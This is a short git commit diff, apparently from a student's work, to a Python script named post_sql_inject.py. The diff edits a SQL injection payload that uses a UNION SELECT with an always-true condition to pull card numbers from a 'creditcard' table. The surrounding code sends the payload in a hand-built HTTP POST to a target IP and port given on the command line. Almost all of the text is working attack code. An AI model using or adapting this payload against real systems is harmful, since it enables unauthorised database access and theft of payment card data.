82f21d72d1821fd4f77157f22f34274c9c7f2a6c
Benjamin Fuhlbrügge <s176110@hft-leipzig.de>
2020-08-05 15:40:13 +0200

    wd

--- post_sql_inject.py
+++ post_sql_inject.py
@@ -32,7 +32,7 @@ http_port = int(sys.argv[2])
 destination_ip = sys.argv[1]
 s_port = random.randint(20000,65500)
 
-injection_string = '1 UNION ALL SELECT cardnumber,1 FROM creditcard' #WHERE "1"="1'
+injection_string = '1 UNION ALL SELECT cardnumber,1 FROM creditcard WHERE "1"="1'
 cont_length = len(injection_string)
 getStr = 'POST / HTTP/1.1\r\nHost:' + destination_ip + '\r\nAccept-Encoding: 8bit\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ' + str(cont_length) + '\r\n\r\n' + injection_string
 
